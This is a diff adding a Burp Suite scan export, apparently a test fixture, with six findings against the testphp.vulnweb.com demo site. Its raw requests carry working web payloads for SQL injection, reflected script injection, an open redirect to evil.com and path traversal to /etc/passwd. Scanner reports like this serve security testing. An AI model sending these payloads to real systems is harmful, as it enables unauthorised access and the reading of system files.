@@ -1,0 +1,140 @@
+<?xml version="1.0"?>
+<!DOCTYPE issues [
+<!ELEMENT issues (issue*)>
+<!ELEMENT issue (serialNumber, type, name, host, path, location, severity, confidence, issueBackground?, remediationBackground?, issueDetail?, remediationDetail?, requestresponse*)>
+]>
+<issues burpVersion="2023.10.3.2" exportTime="Mon Nov 06 12:00:00 IST 2023">
+  <issue>
+    <serialNumber>1234567891011121314</serialNumber>
+    <type>1048832</type>
+    <name>SQL Injection</name>
+    <host ip="203.0.113.5">https://testphp.vulnweb.com</host>
+    <path>/search.php</path>
+    <location>Parameter: q [GET]</location>
+    <severity>High</severity>
+    <confidence>Certain</confidence>
+    <issueBackground>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner.</issueBackground>
+    <issueDetail>The parameter q appears to be vulnerable to SQL injection attacks. The payload ' OR '1'='1 was submitted.</issueDetail>
+    <requestresponse>
+      <request base64="false">GET /search.php?q=test'+OR+'1'%3D'1&amp;submit=Search HTTP/1.1
+Host: testphp.vulnweb.com
+User-Agent: Mozilla/5.0
+Accept: text/html
+
+</request>
+      <response base64="false">HTTP/1.1 200 OK
+Content-Type: text/html
+
+&lt;html&gt;Results: admin, user1, user2&lt;/html&gt;</response>
+    </requestresponse>
+  </issue>
+
+  <issue>
+    <serialNumber>2234567891011121314</serialNumber>
+    <type>2097920</type>
+    <name>Cross-site scripting (reflected)</name>
+    <host ip="203.0.113.5">https://testphp.vulnweb.com</host>
+    <path>/listproducts.php</path>
+    <location>Parameter: cat [GET]</location>
+    <severity>High</severity>
+    <confidence>Firm</confidence>
+    <issueDetail>The parameter cat is vulnerable to reflected XSS. Payload: &lt;script&gt;alert(1)&lt;/script&gt;</issueDetail>
+    <requestresponse>
+      <request base64="false">GET /listproducts.php?cat=1%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
+Host: testphp.vulnweb.com
+
+</request>
+      <response base64="false">HTTP/1.1 200 OK
+Content-Type: text/html
+
+&lt;html&gt;Category: &lt;script&gt;alert(1)&lt;/script&gt;&lt;/html&gt;</response>
+    </requestresponse>
+  </issue>
+
+  <issue>
+    <serialNumber>3234567891011121314</serialNumber>
+    <type>5244416</type>
+    <name>Open redirection (reflected)</name>
+    <host ip="203.0.113.5">https://testphp.vulnweb.com</host>
+    <path>/redirect.php</path>
+    <location>Parameter: url [GET]</location>
+    <severity>Medium</severity>
+    <confidence>Certain</confidence>
+    <issueDetail>The url parameter is used in an HTTP redirect without validation.</issueDetail>
+    <requestresponse>
+      <request base64="false">GET /redirect.php?url=https://evil.com HTTP/1.1
+Host: testphp.vulnweb.com
+
+</request>
+      <response base64="false">HTTP/1.1 302 Found
+Location: https://evil.com</response>
+    </requestresponse>
+  </issue>
+
+  <issue>
+    <serialNumber>4234567891011121314</serialNumber>
+    <type>134217728</type>
+    <name>Password field submitted using GET method</name>
+    <host ip="203.0.113.5">https://testphp.vulnweb.com</host>
+    <path>/login.php</path>
+    <location>Parameter: password [GET]</location>
+    <severity>Low</severity>
+    <confidence>Certain</confidence>
+    <issueDetail>The password field is transmitted via GET request, exposing it in logs and history.</issueDetail>
+    <requestresponse>
+      <request base64="false">GET /login.php?username=admin&amp;password=secret123 HTTP/1.1
+Host: testphp.vulnweb.com
+
+</request>
+      <response base64="false">HTTP/1.1 200 OK
+Content-Type: text/html
+
+Welcome admin!</response>
+    </requestresponse>
+  </issue>
+
+  <issue>
+    <serialNumber>5234567891011121314</serialNumber>
+    <type>1049088</type>
+    <name>SQL Injection (second order)</name>
+    <host ip="203.0.113.5">https://testphp.vulnweb.com</host>
+    <path>/api/user/update</path>
+    <location>Parameter: email [Body]</location>
+    <severity>High</severity>
+    <confidence>Tentative</confidence>
+    <issueDetail>Second-order SQL injection detected in email field of user update endpoint.</issueDetail>
+    <requestresponse>
+      <request base64="false">POST /api/user/update HTTP/1.1
+Host: testphp.vulnweb.com
+Content-Type: application/x-www-form-urlencoded
+
+user_id=5&amp;email=test%40test.com'--&amp;token=abc123</request>
+      <response base64="false">HTTP/1.1 500 Internal Server Error
+Content-Type: application/json
+
+{"error":"database error"}</response>
+    </requestresponse>
+  </issue>
+
+  <issue>
+    <serialNumber>6234567891011121314</serialNumber>
+    <type>16777536</type>
+    <name>Path traversal</name>
+    <host ip="203.0.113.5">https://testphp.vulnweb.com</host>
+    <path>/showimage.php</path>
+    <location>Parameter: file [GET]</location>
+    <severity>High</severity>
+    <confidence>Firm</confidence>
+    <issueDetail>The file parameter is vulnerable to path traversal. ../../etc/passwd was accessible.</issueDetail>
+    <requestresponse>
+      <request base64="false">GET /showimage.php?file=../../etc/passwd HTTP/1.1
+Host: testphp.vulnweb.com
+
+</request>
+      <response base64="false">HTTP/1.1 200 OK
+Content-Type: image/jpeg
+
+root:x:0:0:root</response>
+    </requestresponse>
+  </issue>
+</issues>
